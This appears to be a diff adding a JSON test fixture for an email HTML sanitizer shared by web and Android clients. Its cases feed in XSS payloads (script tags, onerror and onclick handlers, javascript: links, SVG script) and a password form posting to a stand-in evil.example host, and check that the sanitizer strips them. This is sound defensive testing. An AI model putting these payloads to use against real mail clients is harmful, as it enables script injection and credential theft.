@@ -1,0 +1,365 @@
+{
+  "_doc": {
+    "about": "Message HTML cleaning both clients must pass: web cleanMessageHtml (web/src/lib/sanitize.ts, DOMPurify) and Android cleanMessageHtml (android/core/.../mail/EmailHtml.kt, jsoup Safelist). They serialize differently, so cases check characteristics, not exact output.",
+    "cidMissing": "Optional per case: content id → label for an inline image whose part couldn't be fetched (offline). Run cleanMessageHtml(html, cidUrls, cidMissing): an <img> with that cid and no data URL becomes a <span data-cid-missing> box whose text is the label; a cid in neither map just loses its src. `opensOnline` is the text both apps put after an unfetched part's name and size; `missingLabels` pin missingPartLabel(filename, size): the name when there is one, the size as attachments show it, then that text, joined by \" · \".",
+    "check": "Run cleanMessageHtml(html, cidUrls) → { html, hasRemoteImages, colorSchemes }. hasRemoteImages and colorSchemes (the contents of `color-scheme` and `supported-color-schemes` meta tags, in order) must equal the fixture's. Normalize the output: '<br />' and '<br/>' → '<br>', whitespace between tags removed (/>\\s+</ → '><'), other whitespace runs → one space. Every `contains` string must appear in it as is; no `absent` string may appear in it, compared case-insensitively. Attribute checks name one attribute in double quotes, so attribute order and quoting style of the rest don't matter.",
+    "edgeMargins": "A body's leading <p> gets margin-top:0 and its trailing <p> margin-bottom:0, appended to its style (with ';' when the style doesn't end in one). The edge is the first (last) child that is an element other than style, meta, link or title, skipping whitespace text and comments, looked for again inside div, center, section, article, main, header and footer; text there, or any other element, means no paragraph is trimmed on that side."
+  },
+  "cases": [
+    {
+      "name": "scripts go, with their text",
+      "html": "<p>Hi</p><script>alert(1)</script>",
+      "cidUrls": {},
+      "hasRemoteImages": false,
+      "contains": [
+        ">Hi</p>"
+      ],
+      "absent": [
+        "<script",
+        "alert(1)"
+      ],
+      "colorSchemes": []
+    },
+    {
+      "name": "event handlers go; cid images become their data URLs",
+      "html": "<img src=\"cid:logo@mail.example\" onerror=\"alert(1)\" alt=\"Logo\">",
+      "cidUrls": {
+        "logo@mail.example": "data:image/png;base64,iVBORw0KGgo="
+      },
+      "hasRemoteImages": false,
+      "contains": [
+        "src=\"data:image/png;base64,iVBORw0KGgo=\"",
+        "alt=\"Logo\""
+      ],
+      "absent": [
+        "onerror",
+        "cid:"
+      ],
+      "colorSchemes": []
+    },
+    {
+      "name": "an unknown cid loses its src",
+      "html": "<p><img src=\"cid:missing@mail.example\" alt=\"x\"></p>",
+      "cidUrls": {},
+      "hasRemoteImages": false,
+      "contains": [
+        "alt=\"x\""
+      ],
+      "absent": [
+        "cid:",
+        "src="
+      ],
+      "colorSchemes": []
+    },
+    {
+      "name": "an inline image not fetched offline becomes a box with its name and size",
+      "html": "<p>Before<img src=\"cid:photo@mail.example\" width=\"600\" alt=\"x\">after</p>",
+      "cidUrls": {},
+      "cidMissing": {
+        "photo@mail.example": "photo.jpg · 1.2 MB · Opens when you're back online"
+      },
+      "hasRemoteImages": false,
+      "contains": [
+        "data-cid-missing",
+        ">photo.jpg · 1.2 MB · Opens when you're back online</span>",
+        "Before<span",
+        "</span>after</p>"
+      ],
+      "absent": [
+        "<img",
+        "cid:",
+        "width=\"600\""
+      ],
+      "colorSchemes": []
+    },
+    {
+      "name": "a fetched inline image wins over its offline label; a cid background just loses it",
+      "html": "<img src=\"cid:logo@mail.example\"><table><tr><td background=\"cid:bg@mail.example\">x</td></tr></table>",
+      "cidUrls": {
+        "logo@mail.example": "data:image/png;base64,iVBORw0KGgo="
+      },
+      "cidMissing": {
+        "logo@mail.example": "logo.png · 2 KB · Opens when you're back online",
+        "bg@mail.example": "bg.png · 3 KB · Opens when you're back online"
+      },
+      "hasRemoteImages": false,
+      "contains": [
+        "src=\"data:image/png;base64,iVBORw0KGgo=\"",
+        ">x</td>"
+      ],
+      "absent": [
+        "data-cid-missing",
+        "cid:",
+        "background="
+      ],
+      "colorSchemes": []
+    },
+    {
+      "name": "javascript: and data: links go; web and mail links stay, without a referrer",
+      "html": "<a href=\"javascript:alert(1)\">x</a><a href=\"data:text/html;base64,PHNjcmlwdD4=\">d</a><a href=\"https://example.com/a\">y</a><a href=\"mailto:hi@example.com\">m</a>",
+      "cidUrls": {},
+      "hasRemoteImages": false,
+      "contains": [
+        "href=\"https://example.com/a\"",
+        "href=\"mailto:hi@example.com\"",
+        "rel=\"noopener noreferrer\""
+      ],
+      "absent": [
+        "javascript:",
+        "data:text/html"
+      ],
+      "colorSchemes": []
+    },
+    {
+      "name": "upper-case tags and handlers",
+      "html": "<A HREF=\"https://example.com/b\" ONCLICK=\"steal()\">B</A>",
+      "cidUrls": {},
+      "hasRemoteImages": false,
+      "contains": [
+        "href=\"https://example.com/b\"",
+        ">B</a>"
+      ],
+      "absent": [
+        "onclick",
+        "steal()"
+      ],
+      "colorSchemes": []
+    },
+    {
+      "name": "forms and their controls go, the text after stays",
+      "html": "<form action=\"https://evil.example/steal\" method=\"post\"><input name=\"password\" type=\"password\"><textarea>t</textarea><select><option>o</option></select><button>Go</button></form><p>after</p>",
+      "cidUrls": {},
+      "hasRemoteImages": false,
+      "contains": [
+        ">after</p>"
+      ],
+      "absent": [
+        "<form",
+        "<input",
+        "<textarea",
+        "<select",
+        "<button",
+        "evil.example"
+      ],
+      "colorSchemes": []
+    },
+    {
+      "name": "frames, objects, embeds, base, meta and stylesheet links go",
+      "html": "<base href=\"https://evil.example/\"><meta http-equiv=\"refresh\" content=\"0;url=https://evil.example/r\"><link rel=\"stylesheet\" href=\"https://cdn.example/s.css\"><iframe src=\"https://evil.example/f\"></iframe><object data=\"https://evil.example/o.swf\"></object><embed src=\"https://evil.example/e\"><p>body</p>",
+      "cidUrls": {},
+      "hasRemoteImages": false,
+      "contains": [
+        ">body</p>"
+      ],
+      "absent": [
+        "<base",
+        "<meta",
+        "<link",
+        "<iframe",
+        "<object",
+        "<embed",
+        "evil.example",
+        "cdn.example"
+      ],
+      "colorSchemes": []
+    },
+    {
+      "name": "scripts inside SVG go",
+      "html": "<svg><script>alert(2)</script></svg><p>ok</p>",
+      "cidUrls": {},
+      "hasRemoteImages": false,
+      "contains": [
+        ">ok</p>"
+      ],
+      "absent": [
+        "<script",
+        "alert(2)"
+      ],
+      "colorSchemes": []
+    },
+    {
+      "name": "comments go",
+      "html": "<!-- internal note: account 1234 --><p>x</p>",
+      "cidUrls": {},
+      "hasRemoteImages": false,
+      "contains": [
+        ">x</p>"
+      ],
+      "absent": [
+        "internal note",
+        "<!--"
+      ],
+      "colorSchemes": []
+    },
+    {
+      "name": "a tracking pixel is kept but reported",
+      "html": "<p>Hello</p><img src=\"https://tracker.example/open.gif?u=42\" width=\"1\" height=\"1\" alt=\"\">",
+      "cidUrls": {},
+      "hasRemoteImages": true,
+      "contains": [
+        "src=\"https://tracker.example/open.gif?u=42\"",
+        ">Hello</p>"
+      ],
+      "absent": [],
+      "colorSchemes": []
+    },
+    {
+      "name": "protocol-relative images are remote",
+      "html": "<img src=\"//cdn.example/logo.png\">",
+      "cidUrls": {},
+      "hasRemoteImages": true,
+      "contains": [
+        "cdn.example/logo.png"
+      ],
+      "absent": [],
+      "colorSchemes": []
+    },
+    {
+      "name": "remote images in srcset",
+      "html": "<img srcset=\"https://cdn.example/a.png 1x, https://cdn.example/b.png 2x\" alt=\"hero\">",
+      "cidUrls": {},
+      "hasRemoteImages": true,
+      "contains": [
+        "alt=\"hero\""
+      ],
+      "absent": [],
+      "colorSchemes": []
+    },
+    {
+      "name": "remote images in inline style",
+      "html": "<table><tr><td style=\"background-image:url('https://cdn.example/bg.png')\">x</td></tr></table>",
+      "cidUrls": {},
+      "hasRemoteImages": true,
+      "contains": [
+        ">x</td>"
+      ],
+      "absent": [],
+      "colorSchemes": []
+    },
+    {
+      "name": "remote images in a style element",
+      "html": "<style>.hero{background:url(https://cdn.example/hero.png)}</style><div class=\"hero\">x</div>",
+      "cidUrls": {},
+      "hasRemoteImages": true,
+      "contains": [
+        "class=\"hero\""
+      ],
+      "absent": [],
+      "colorSchemes": []
+    },
+    {
+      "name": "data images are not remote",
+      "html": "<img src=\"data:image/png;base64,AAAA\" alt=\"inline\"><div style=\"background:url(data:image/png;base64,BBBB)\">y</div>",
+      "cidUrls": {},
+      "hasRemoteImages": false,
+      "contains": [
+        "src=\"data:image/png;base64,AAAA\""
+      ],
+      "absent": [],
+      "colorSchemes": []
+    },
+    {
+      "name": "mail layout is kept: tables, attributes, fonts, inline styles",
+      "html": "<center><table cellpadding=\"0\" cellspacing=\"0\" bgcolor=\"#ffffff\" width=\"600\"><tr><td align=\"center\" valign=\"top\" style=\"color:#333333\"><font face=\"Arial\" size=\"2\">Cell</font></td></tr></table></center>",
+      "cidUrls": {},
+      "hasRemoteImages": false,
+      "contains": [
+        "<table",
+        "cellpadding=\"0\"",
+        "bgcolor=\"#ffffff\"",
+        "width=\"600\"",
+        "align=\"center\"",
+        "valign=\"top\"",
+        "style=\"color:#333333\"",
+        "face=\"Arial\"",
+        ">Cell</font>"
+      ],
+      "absent": [],
+      "colorSchemes": []
+    },
+    {
+      "name": "text and line breaks are kept",
+      "html": "<div dir=\"auto\">Line one<br>Line <b>two</b> &amp; more</div>",
+      "cidUrls": {},
+      "hasRemoteImages": false,
+      "contains": [
+        "Line one<br>Line <b>two</b> &amp; more",
+        "dir=\"auto\""
+      ],
+      "absent": [],
+      "colorSchemes": []
+    },
+    {
+      "name": "color-scheme meta tags go, their contents reported",
+      "html": "<html><head><meta name=\"color-scheme\" content=\"light dark\"><meta name=\"Supported-Color-Schemes\" content=\"light dark\"><meta name=\"viewport\" content=\"width=device-width\"></head><body><p>Hi</p></body></html>",
+      "cidUrls": {},
+      "hasRemoteImages": false,
+      "contains": [
+        ">Hi</p>"
+      ],
+      "absent": [
+        "<meta"
+      ],
+      "colorSchemes": [
+        "light dark",
+        "light dark"
+      ]
+    },
+    {
+      "name": "a leading paragraph loses its top margin and a trailing one its bottom margin",
+      "html": "<p>First</p><p>Middle</p><p>Last</p>",
+      "cidUrls": {},
+      "hasRemoteImages": false,
+      "contains": [
+        "<p style=\"margin-top:0\">First</p><p>Middle</p><p style=\"margin-bottom:0\">Last</p>"
+      ],
+      "absent": [],
+      "colorSchemes": []
+    },
+    {
+      "name": "edge paragraphs are found through wrappers and whitespace, their own styles kept",
+      "html": "<html><head><style>p{color:red}</style></head><body>\n<div class=\"moz-text-html\">\n  <p style=\"color:#333\">Hi</p>\n  <div><p style=\"margin:0 0 1em;\">Bye</p></div>\n</div>\n</body></html>",
+      "cidUrls": {},
+      "hasRemoteImages": false,
+      "contains": [
+        "<p style=\"color:#333;margin-top:0\">Hi</p>",
+        "<p style=\"margin:0 0 1em;margin-bottom:0\">Bye</p>"
+      ],
+      "absent": [],
+      "colorSchemes": []
+    },
+    {
+      "name": "a paragraph after text or before other content keeps its margins",
+      "html": "<div>Hello<p>Middle</p></div><p>Then</p><table><tr><td>Cell</td></tr></table>",
+      "cidUrls": {},
+      "hasRemoteImages": false,
+      "contains": [
+        "Hello<p>Middle</p>",
+        "<p>Then</p>"
+      ],
+      "absent": [
+        "margin-top:0",
+        "margin-bottom:0"
+      ],
+      "colorSchemes": []
+    }
+  ],
+  "opensOnline": "Opens when you're back online",
+  "missingLabels": [
+    {
+      "filename": "photo.jpg",
+      "size": 1258291,
+      "expect": "photo.jpg · 1.2 MB · Opens when you're back online"
+    },
+    {
+      "filename": "",
+      "size": 2048,
+      "expect": "2 KB · Opens when you're back online"
+    },
+    {
+      "filename": "dot.gif",
+      "size": 43,
+      "expect": "dot.gif · 43 B · Opens when you're back online"
+    }
+  ]
+}
